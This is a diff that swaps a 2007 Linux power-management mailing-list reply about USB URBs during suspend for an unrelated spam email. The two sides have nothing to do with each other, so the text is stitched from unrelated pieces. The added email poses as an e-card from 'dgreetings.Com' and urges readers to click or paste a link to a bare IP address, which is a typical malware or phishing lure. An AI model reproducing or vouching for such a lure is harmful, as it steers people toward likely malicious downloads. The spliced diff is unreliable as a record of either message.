@@ -1,17 +1,12 @@
-From: Paul Mackerras <paulus@samba.org>
-Subject: Re: Re: [PATCH] Remove process freezer from suspend to RAM
-	pathway
-Date: Wed, 4 Jul 2007 19:21:23 +1000
-Message-ID: <18059.26259.765791.62319__488.061880651181$1183541247$gmane$org@cargo.ozlabs.ibm.com>
-References: <20070703042916.GA17240@srcf.ucam.org>
-	<200707041011.33279.oliver@neukum.org>
-	<18059.23015.860618.268754@cargo.ozlabs.ibm.com>
-	<200707041039.30015.oliver@neukum.org>
+From: "dgreetings.Com" <hwqo@marubeni.com>
+Subject: Independence Day Celebration
+Date: Wed, 4 Jul 2007 16:39:58 +0700
+Message-ID: <002401c7be1f$497eaa50$9354a743@jrat.bv>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: text/plain; format=flowed; charset="Windows-1252";
+	reply-type=original
 Content-Transfer-Encoding: 7bit
 Return-path: <linux-pm-bounces@lists.linux-foundation.org>
-In-Reply-To: <200707041039.30015.oliver@neukum.org>
 List-Unsubscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
 	<mailto:linux-pm-request@lists.linux-foundation.org?subject=unsubscribe>
 List-Archive: <http://lists.linux-foundation.org/pipermail/linux-pm>
@@ -21,26 +16,35 @@ List-Subscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
 	<mailto:linux-pm-request@lists.linux-foundation.org?subject=subscribe>
 Sender: linux-pm-bounces@lists.linux-foundation.org
 Errors-To: linux-pm-bounces@lists.linux-foundation.org
-To: Oliver Neukum <oliver@neukum.org>
-Cc: Matthew Garrett <mjg59@srcf.ucam.org>, linux-pm@lists.linux-foundation.org, linux-kernel@vger.kernel.org
+To: linux-pm@osdl.org
 List-Id: linux-pm@vger.kernel.org
 
-Oliver Neukum writes:
+Hi. Class mate has sent you an ecard.
+See your card as often as you wish during the next 15 days.
 
-> > It's not lost, it's sitting in RAM, and will be sent out when you
-> > resume.
-> 
-> Unfortunately this is not the case. The URB will error out.
+SEEING YOUR CARD
 
-So the higher-level driver needs to do the sensible thing, i.e.,
-resubmit the URB after resume.  It's not rocket science.  The data is
-not lost, it's sitting in RAM, and the higher-level driver will send
-it out when you resume.  If not, then we fix the higher-level driver.
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
 
-Of course with USB there is the interesting question of whether the
-device is still there when we resume.  But if it isn't, the situation
-is no different to the user asynchronously unplugging the device
-during operation, and if we lose data in that situation, we can only
-blame the user. :)
+http://85.196.153.254/?7271dc60eae57a4a6c198eb161d496d298990
 
-Paul.
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+     
+
+
+PRIVACY
+dgreetings.Com honors your privacy. Our home page and Card Pick Up have links to our 
+Privacy Policy.
+
+TERMS OF USE
+By accessing your card you agree we have no liability. 
+If you don't know the person sending the card or don't wish to see the card, 
+please disregard this Announcement.
+
+We hope you enjoy your awesome card.
+
+Wishing you the best,
+Administrator,
+dgreetings.Com
